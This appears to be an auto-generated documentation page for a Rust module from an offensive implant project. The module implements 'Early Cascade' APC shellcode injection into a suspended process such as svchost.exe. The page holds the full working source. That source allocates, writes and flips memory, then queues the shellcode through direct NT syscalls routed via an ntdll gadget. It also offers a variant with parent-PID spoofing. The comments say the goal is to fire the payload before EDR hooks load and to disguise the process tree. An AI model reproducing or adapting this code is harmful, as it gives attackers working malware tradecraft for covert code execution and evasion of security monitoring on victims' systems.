# crowd -- early_cascade.rs  (S TIER -- pure NT API, pre-LdrInitializeThunk)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/early_cascade.rs` |
| **Lines** | 363 |
| **Tier** | S |
| **Cards** | T007-process-injection |
| **Role** | Early Cascade (pre-LdrInitializeThunk) |
| **Unsafe blocks** | 5 |

## Purpose

# crowd -- early_cascade.rs  (S TIER -- pure NT API, pre-LdrInitializeThunk)

## Early Cascade APC Injection (OPSEC 9.5)

Injects shellcode via `NtQueueApcThread` targeting the APC dispatching mechanism
BEFORE the PE entry point executes -- specifically before `ntdll!LdrInitializeThunk`
completes the initialization cascade.  The process exists in the kernel but the
EDR has not begun monitoring it yet.

### Difference from Early Bird
Early Bird uses `QueueUserAPC` (kernel32) which generates Win32 telemetry.
Early Cascade uses pure NT syscalls via RecycledGate for every step:
- Process creation via `CreateProcessW(CREATE_SUSPENDED)` or PPID-spoofed variant
- Memory allocation via `NtAllocateVirtualMemory`
- Memory write via `NtWriteVirtualMemory`
- Protection change via `NtProtectVirtualMemory` (RW -> RX)
- APC queuing via `NtQueueApcThread` (not `QueueUserAPC`)
- Thread resume via `NtResumeThread`

The timing window is tighter: injection happens before ntdll's LdrInitializeThunk
completes, meaning the APC fires during the initialization cascade itself --
before CRT init, before TLS callbacks, before any DLL_PROCESS_ATTACH runs.

### Sequence
1. `CreateProcess(CREATE_SUSPENDED)` -- sacrificial process, main thread frozen
2. `NtAllocateVirtualMemory` -- allocate RW region in target
3. `NtWriteVirtualMemory` -- write shellcode payload
4. `NtProtectVirtualMemory` -- flip RW -> RX (W^X compliant)
5. `NtQueueApcThread` -- queue APC with shellcode as the routine
6. `NtResumeThread` -- APC dispatches during initialization cascade

All NT calls go through RecycledGate (JMP into ntdll's `0F 05 C3` gadget),
so ETW-TI sees the kernel transition from ntdll .text, not implant memory.

## Constants

- `CREATE_SUSPENDED`: `u32` = `0x00000004`
- `MEM_COMMIT_RESERVE`: `u32` = `0x00003000` — MEM_COMMIT | MEM_RESERVE
- `PAGE_READWRITE`: `u32` = `0x04`
- `PAGE_EXECUTE_READ`: `u32` = `0x20`
- `MEM_RELEASE`: `u32` = `0x8000`

## Types

### struct `ProcessBasicInformation` (line 223)

## Public API

### `cascade_inject` (line 263)
```rust
pub fn cascade_inject(target_exe: &str, shellcode: &[u8]) -> anyhow::Result<u32>
```
Inject shellcode via Early Cascade into a new suspended process.

Creates a sacrificial process in SUSPENDED state, writes shellcode into its
address space, then queues an APC via `NtQueueApcThread` targeting the
initialization cascade.  When the thread resumes, the APC fires before the
PE entry point -- before EDR hooks or DLL instrumentation are active.

# Arguments
* `target_exe` -- Path to the sacrificial process (e.g., `C:\Windows\System32\svchost.exe`)
* `shellcode`  -- The payload to inject

# Returns
`Ok(pid)` of the injected process on success, `Err` on failure.

### `cascade_inject_ppid` (line 329)
```rust
pub fn cascade_inject_ppid(
```
Cascade inject with PPID spoofing.

Creates a suspended process with a spoofed parent PID (for process tree
masquerading), then injects via the Early Cascade APC technique.

# Arguments
* `target_exe`  -- Path to the sacrificial process
* `shellcode`   -- The payload to inject
* `parent_pid`  -- PID of the fake parent (0 = auto-detect explorer.exe)

# Returns
`Ok(pid)` of the injected process on success, `Err` on failure.

### `cascade_inject_default` (line 361)
```rust
pub fn cascade_inject_default(shellcode: &[u8]) -> anyhow::Result<u32>
```
Convenience: cascade inject into a default sacrificial process (svchost.exe).

## Internal Functions

- `cascade_inject_into` (unsafe) — Core injection logic operating on raw process/thread handles. (line 56)
- `query_pid_from_handle` (unsafe) — Extract PID from a process handle via NtQueryInformationProcess. (line 221)

## Key Dependencies

- `use crate::mega_dbg;`

## Full Source

```rust
//! # crowd -- early_cascade.rs  (S TIER -- pure NT API, pre-LdrInitializeThunk)
//!
//! ## Early Cascade APC Injection (OPSEC 9.5)
//!
//! Injects shellcode via `NtQueueApcThread` targeting the APC dispatching mechanism
//! BEFORE the PE entry point executes -- specifically before `ntdll!LdrInitializeThunk`
//! completes the initialization cascade.  The process exists in the kernel but the
//! EDR has not begun monitoring it yet.
//!
//! ### Difference from Early Bird
//! Early Bird uses `QueueUserAPC` (kernel32) which generates Win32 telemetry.
//! Early Cascade uses pure NT syscalls via RecycledGate for every step:
//!   - Process creation via `CreateProcessW(CREATE_SUSPENDED)` or PPID-spoofed variant
//!   - Memory allocation via `NtAllocateVirtualMemory`
//!   - Memory write via `NtWriteVirtualMemory`
//!   - Protection change via `NtProtectVirtualMemory` (RW -> RX)
//!   - APC queuing via `NtQueueApcThread` (not `QueueUserAPC`)
//!   - Thread resume via `NtResumeThread`
//!
//! The timing window is tighter: injection happens before ntdll's LdrInitializeThunk
//! completes, meaning the APC fires during the initialization cascade itself --
//! before CRT init, before TLS callbacks, before any DLL_PROCESS_ATTACH runs.
//!
//! ### Sequence
//! 1. `CreateProcess(CREATE_SUSPENDED)` -- sacrificial process, main thread frozen
//! 2. `NtAllocateVirtualMemory` -- allocate RW region in target
//! 3. `NtWriteVirtualMemory` -- write shellcode payload
//! 4. `NtProtectVirtualMemory` -- flip RW -> RX (W^X compliant)
//! 5. `NtQueueApcThread` -- queue APC with shellcode as the routine
//! 6. `NtResumeThread` -- APC dispatches during initialization cascade
//!
//! All NT calls go through RecycledGate (JMP into ntdll's `0F 05 C3` gadget),
//! so ETW-TI sees the kernel transition from ntdll .text, not implant memory.

#![allow(dead_code, non_snake_case)]

use std::ffi::c_void;
use std::ptr::null_mut;
#[allow(unused_imports)]
use crate::mega_dbg;

// -- Constants ----------------------------------------------------------------

const CREATE_SUSPENDED: u32 = 0x00000004;
const MEM_COMMIT_RESERVE: u32 = 0x00003000; // MEM_COMMIT | MEM_RESERVE
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const MEM_RELEASE: u32 = 0x8000;

// -- Internal: inject into an already-created suspended process ---------------

/// Core injection logic operating on raw process/thread handles.
/// Handles are consumed (closed on error paths, caller closes on success).
///
/// Returns the PID of the injected process.
unsafe fn cascade_inject_into(
    h_proc_raw: usize,
    h_thread_raw: usize,
    shellcode: &[u8],
    pid: u32,
) -> anyhow::Result<u32> {
    // -- Step 2: Allocate RW memory in target via NtAllocateVirtualMemory ------
    let mut remote_addr: *mut c_void = null_mut();
    let mut region_size = shellcode.len();
    let status = crate::recycled::nt_allocate_virtual_memory(
        h_proc_raw,
        &mut remote_addr,
        0,
        &mut region_size,
        MEM_COMMIT_RESERVE,
        PAGE_READWRITE,
    );

    if status < 0 || remote_addr.is_null() {
        crate::recycled::nt_terminate_process(h_proc_raw, 1);
        crate::recycled::nt_close(h_thread_raw);
        crate::recycled::nt_close(h_proc_raw);
        anyhow::bail!(
            "EarlyCascade: NtAllocateVirtualMemory failed (NTSTATUS 0x{:08x})",
            status as u32
        );
    }

    mega_dbg!(
        "EarlyCascade: allocated {} bytes at {:p} in PID={}",
        shellcode.len(),
        remote_addr,
        pid
    );

    // -- Step 3: Write shellcode via NtWriteVirtualMemory ----------------------
    let mut written: usize = 0;
    let status = crate::recycled::nt_write_virtual_memory(
        h_proc_raw,
        remote_addr,
        shellcode.as_ptr() as *const c_void,
        shellcode.len(),
        &mut written,
    );

    if status < 0 {
        // Cleanup: free the allocated region, terminate, close handles
        let mut base = remote_addr;
        let mut sz: usize = 0;
        crate::recycled::nt_free_virtual_memory(h_proc_raw, &mut base, &mut sz, MEM_RELEASE);
        crate::recycled::nt_terminate_process(h_proc_raw, 1);
        crate::recycled::nt_close(h_thread_raw);
        crate::recycled::nt_close(h_proc_raw);
        anyhow::bail!(
            "EarlyCascade: NtWriteVirtualMemory failed (NTSTATUS 0x{:08x})",
            status as u32
        );
    }

    mega_dbg!(
        "EarlyCascade: wrote {} bytes ({} reported) to {:p}",
        shellcode.len(),
        written,
        remote_addr
    );

    // -- Step 4: Flip RW -> RX via NtProtectVirtualMemory ----------------------
    let mut base_prot = remote_addr;
    let mut prot_size = shellcode.len();
    let mut old_protect: u32 = 0;
    let status = crate::recycled::nt_protect_virtual_memory(
        h_proc_raw,
        &mut base_prot,
        &mut prot_size,
        PAGE_EXECUTE_READ,
        &mut old_protect,
    );

    if status < 0 {
        // CRITICAL: if protection flip fails, the shellcode page stays RW — DEP won't protect it.
        // Abort to avoid leaving a RW+executable region that EDRs can flag.
        mega_dbg!(
            "EarlyCascade: NtProtectVirtualMemory RW->RX failed (0x{:08x}) -- aborting",
            status as u32
        );
        let mut base = remote_addr;
        let mut sz: usize = 0;
        crate::recycled::nt_free_virtual_memory(h_proc_raw, &mut base, &mut sz, MEM_RELEASE);
        crate::recycled::nt_terminate_process(h_proc_raw, 1);
        crate::recycled::nt_close(h_thread_raw);
        crate::recycled::nt_close(h_proc_raw);
        anyhow::bail!(
            "EarlyCascade: NtProtectVirtualMemory RW->RX failed (NTSTATUS 0x{:08x})",
            status as u32
        );
    }

    // -- Step 5: Queue APC via NtQueueApcThread (NOT QueueUserAPC) -------------
    //
    // NtQueueApcThread queues a kernel-mode APC directly.  The APC routine
    // is our shellcode address.  When the suspended thread resumes, the APC
    // dispatcher in ntdll fires our routine during the initialization cascade
    // -- before LdrInitializeThunk completes, before CRT init, before any
    // DLL_PROCESS_ATTACH notifications.
    let status = crate::recycled::nt_queue_apc_thread(
        h_thread_raw,
        remote_addr as *mut c_void, // APC routine = shellcode entry
        null_mut(),                 // arg1 (unused)
        null_mut(),                 // arg2 (unused)
        0,                          // arg3 (unused)
    );

    if status < 0 {
        let mut base = remote_addr;
        let mut sz: usize = 0;
        crate::recycled::nt_free_virtual_memory(h_proc_raw, &mut base, &mut sz, MEM_RELEASE);
        crate::recycled::nt_terminate_process(h_proc_raw, 1);
        crate::recycled::nt_close(h_thread_raw);
        crate::recycled::nt_close(h_proc_raw);
        anyhow::bail!(
            "EarlyCascade: NtQueueApcThread failed (NTSTATUS 0x{:08x})",
            status as u32
        );
    }

    mega_dbg!("EarlyCascade: APC queued via NtQueueApcThread -- resuming thread");

    // -- Step 6: Resume thread via NtResumeThread ------------------------------
    //
    // The thread was created suspended (suspend count = 1).  Resuming it
    // decrements the count to 0, which triggers the initialization cascade.
    // The queued APC fires during NtTestAlert inside LdrInitializeThunk,
    // BEFORE the PE entry point executes.
    let mut prev_count: u32 = 0;
    let status = crate::recycled::nt_resume_thread(h_thread_raw, &mut prev_count);

    if status < 0 {
        mega_dbg!(
            "EarlyCascade: NtResumeThread failed (0x{:08x}) -- terminating zombie process",
            status as u32
        );
        crate::recycled::nt_terminate_process(h_proc_raw, 1);
        crate::recycled::nt_close(h_thread_raw);
        crate::recycled::nt_close(h_proc_raw);
        anyhow::bail!(
            "EarlyCascade: NtResumeThread failed (NTSTATUS 0x{:08x})",
            status as u32
        );
    }

    mega_dbg!(
        "EarlyCascade: thread resumed (prev_count={}) -- APC fires in initialization cascade",
        prev_count
    );

    // -- Cleanup handles (process continues running with shellcode) -------------
    crate::recycled::nt_close(h_thread_raw);
    crate::recycled::nt_close(h_proc_raw);

    mega_dbg!("EarlyCascade: injection complete -- PID={}", pid);
    Ok(pid)
}

/// Extract PID from a process handle via NtQueryInformationProcess.
/// Returns 0 if the query fails (non-fatal).
unsafe fn query_pid_from_handle(h_proc: usize) -> u32 {
    #[repr(C)]
    struct ProcessBasicInformation {
        _exit_status: usize,
        _peb_base: usize,
        _affinity_mask: usize,
        _base_priority: usize,
        unique_pid: usize,
        _inherited_from: usize,
    }

    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    let mut ret_len: u32 = 0;
    let status = crate::recycled::nt_query_information_process(
        h_proc,
        0, // ProcessBasicInformation
        &mut pbi as *mut ProcessBasicInformation as *mut u8,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut ret_len,
    );
    if status == 0 {
        pbi.unique_pid as u32
    } else {
        0u32
    }
}

// -- Public API ---------------------------------------------------------------

/// Inject shellcode via Early Cascade into a new suspended process.
///
/// Creates a sacrificial process in SUSPENDED state, writes shellcode into its
/// address space, then queues an APC via `NtQueueApcThread` targeting the
/// initialization cascade.  When the thread resumes, the APC fires before the
/// PE entry point -- before EDR hooks or DLL instrumentation are active.
///
/// # Arguments
/// * `target_exe` -- Path to the sacrificial process (e.g., `C:\Windows\System32\svchost.exe`)
/// * `shellcode`  -- The payload to inject
///
/// # Returns
/// `Ok(pid)` of the injected process on success, `Err` on failure.
pub fn cascade_inject(target_exe: &str, shellcode: &[u8]) -> anyhow::Result<u32> {
    mega_dbg!(
        "EarlyCascade: creating '{}' CREATE_SUSPENDED ({} bytes shellcode)",
        target_exe,
        shellcode.len()
    );

    unsafe {
        // -- Step 1: Create target process in suspended state ------------------
        let mut si: winapi::um::processthreadsapi::STARTUPINFOW = std::mem::zeroed();
        si.cb = std::mem::size_of::<winapi::um::processthreadsapi::STARTUPINFOW>() as u32;

        let mut pi: winapi::um::processthreadsapi::PROCESS_INFORMATION = std::mem::zeroed();

        let mut path_wide: Vec<u16> = target_exe
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let ok = winapi::um::processthreadsapi::CreateProcessW(
            null_mut(),
            path_wide.as_mut_ptr(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        );

        if ok == 0 {
            anyhow::bail!(
                "EarlyCascade: CreateProcessW('{}') failed (GetLastError={})",
                target_exe,
                winapi::um::errhandlingapi::GetLastError()
            );
        }

        let pid = pi.dwProcessId;
        let h_proc_raw = pi.hProcess as usize;
        let h_thread_raw = pi.hThread as usize;

        mega_dbg!(
            "EarlyCascade: PID={} TID={} -- suspended, entering NT injection path",
            pid,
            pi.dwThreadId
        );

        cascade_inject_into(h_proc_raw, h_thread_raw, shellcode, pid)
    }
}

/// Cascade inject with PPID spoofing.
///
/// Creates a suspended process with a spoofed parent PID (for process tree
/// masquerading), then injects via the Early Cascade APC technique.
///
/// # Arguments
/// * `target_exe`  -- Path to the sacrificial process
/// * `shellcode`   -- The payload to inject
/// * `parent_pid`  -- PID of the fake parent (0 = auto-detect explorer.exe)
///
/// # Returns
/// `Ok(pid)` of the injected process on success, `Err` on failure.
pub fn cascade_inject_ppid(
    target_exe: &str,
    shellcode: &[u8],
    parent_pid: u32,
) -> anyhow::Result<u32> {
    mega_dbg!(
        "EarlyCascade+PPID: target='{}' parent_pid={} ({} bytes shellcode)",
        target_exe,
        parent_pid,
        shellcode.len()
    );

    // Use crowd's ppid module: creates a suspended process with spoofed parent
    let (h_proc, h_thread) = crate::ppid::spawn_with_ppid_spoof(target_exe, parent_pid, true)
        .map_err(|e| anyhow::anyhow!("EarlyCascade+PPID: spawn_with_ppid_spoof failed -- {}", e))?;

    let h_proc_raw = h_proc as usize;
    let h_thread_raw = h_thread as usize;

    // Retrieve PID via NtQueryInformationProcess (no Win32 GetProcessId call)
    let pid = unsafe { query_pid_from_handle(h_proc_raw) };

    mega_dbg!(
        "EarlyCascade+PPID: PID={} with spoofed parent={} -- entering NT injection path",
        pid,
        parent_pid
    );

    unsafe { cascade_inject_into(h_proc_raw, h_thread_raw, shellcode, pid) }
}

/// Convenience: cascade inject into a default sacrificial process (svchost.exe).
pub fn cascade_inject_default(shellcode: &[u8]) -> anyhow::Result<u32> {
    cascade_inject(r"C:\Windows\System32\svchost.exe", shellcode)
}

```